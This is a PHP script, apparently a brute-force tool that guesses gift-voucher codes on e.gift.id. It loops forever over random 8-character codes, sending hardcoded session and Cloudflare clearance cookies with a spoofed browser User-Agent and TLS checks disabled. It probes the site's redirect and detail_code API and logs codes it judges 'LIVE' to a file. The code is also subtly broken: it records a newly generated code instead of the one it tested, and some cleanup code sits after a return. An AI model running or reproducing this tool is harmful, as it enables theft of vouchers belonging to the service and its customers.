<?php
error_reporting(0);
function check($url){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_NOBODY, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

$headers = array();
$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:64.0) Gecko/20100101 Firefox/64.0";
$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
$headers[] = "Accept-Language: id,en-US;q=0.7,en;q=0.3";
$headers[] = "Connection: keep-alive";
$headers[] = "Cookie: __cfduid=ddb299454bd3bdb17371f4867616ffffa1545168879; AWSELB=9D5543E50459E0EE1AEA4019B688BE13D25B847A5CDB8D650493AA1D64D23D631FB50F443CE3BF7E534A9C161DADD05027983708CB7D163589DBFDA2AF10750368363AD441; cf_clearance=b7c17b4ed50c2f109b982172168fcbcadc4321d6-1545168891-1800-150; ms-ga-sess=XCrOqnDsyYhgcBs5R43zMi94p83v1FJDQQdrZsEjNJhSuSK5l4okaoiF28hHwmMLwoDmmdNq0on65Yt2Ju0kOwZqVHAyzj79ffHRs1rckLLoXW5sYEtYgG3gYkQLlIY1scmZNVtQkX8pUT97v7XxNi8TDStq02UfOkleieBFQ4O6dk377s5ApwoNJZKhMGbpIlpkSZxVEyVdSXJDz5wdO3ROLU6s9dDvpjuwQ92gV3q2tfMFEgGYxtTI9AFOxGyA";
$headers[] = "Upgrade-Insecure-Requests: 1";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);


return curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close ($ch);
}
function check2($url){
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");

	curl_setopt($ch, CURLOPT_NOBODY, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
$headers = array();
$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:64.0) Gecko/20100101 Firefox/64.0";
$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
$headers[] = "Accept-Language: id,en-US;q=0.7,en;q=0.3";
$headers[] = "Connection: keep-alive";
$headers[] = "Cookie: __cfduid=ddb299454bd3bdb17371f4867616ffffa1545168879; AWSELB=9D5543E50459E0EE1AEA4019B688BE13D25B847A5CDB8D650493AA1D64D23D631FB50F443CE3BF7E534A9C161DADD05027983708CB7D163589DBFDA2AF10750368363AD441; cf_clearance=b7c17b4ed50c2f109b982172168fcbcadc4321d6-1545168891-1800-150; ms-ga-sess=XCrOqnDsyYhgcBs5R43zMi94p83v1FJDQQdrZsEjNJhSuSK5l4okaoiF28hHwmMLwoDmmdNq0on65Yt2Ju0kOwZqVHAyzj79ffHRs1rckLLoXW5sYEtYgG3gYkQLlIY1scmZNVtQkX8pUT97v7XxNi8TDStq02UfOkleieBFQ4O6dk377s5ApwoNJZKhMGbpIlpkSZxVEyVdSXJDz5wdO3ROLU6s9dDvpjuwQ92gV3q2tfMFEgGYxtTI9AFOxGyA";
$headers[] = "Upgrade-Insecure-Requests: 1";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close ($ch);
return $result;
}
function getStr($content,$start,$end){
    $r = explode($start, $content);
    if (isset($r[1])){
        $r = explode($end, $r[1]);
        return $r[0];
    }
    return '';
}
function xxx(){
$s = substr(str_shuffle("abcdef0123456789ghijklmnopqrs0123456789abcdefghijklmnopqrstuvwxyztuvwxyz"), -8);
return $s;
}
$i = 0;
while (true) {	
$cod = "1299";
$gg = check("https://e.gift.id/g/".$cod."/".xxx()."");
$x = getStr($gg,'Location: https://e.gift.id/f/','
Set-Cookie: ms-ga-');
$cx = check2('https://e.gift.id/api/egroups/detail_code/'.$x.'');
	if (stripos($cx, 'status')) {
		$data =  "LIVE -> https://e.gift.id/g/".$cod."/".xxx()." \r\n";
		$fh = fopen("V4-LIVE.txt", "a");
		fwrite($fh, $data);
		fclose($fh);
		echo 'LIVE -> https://e.gift.id/g/'.$cod.'/'.xxx().'';
		echo "\n";		exit();
		ob_flush();	} elseif(stripos($cx,'eVoucher Group not found')){
		echo ''.$i.' DIE -> https://e.gift.id/g/'.$cod.'/'.xxx().'';
		echo "\n";		flush();
		ob_flush();	}else{
		echo 'UNCHECK -> https://e.gift.id/g/'.$cod.'/'.xxx().'';
		echo "\n";		flush();
		ob_flush();
	}
$i++;
}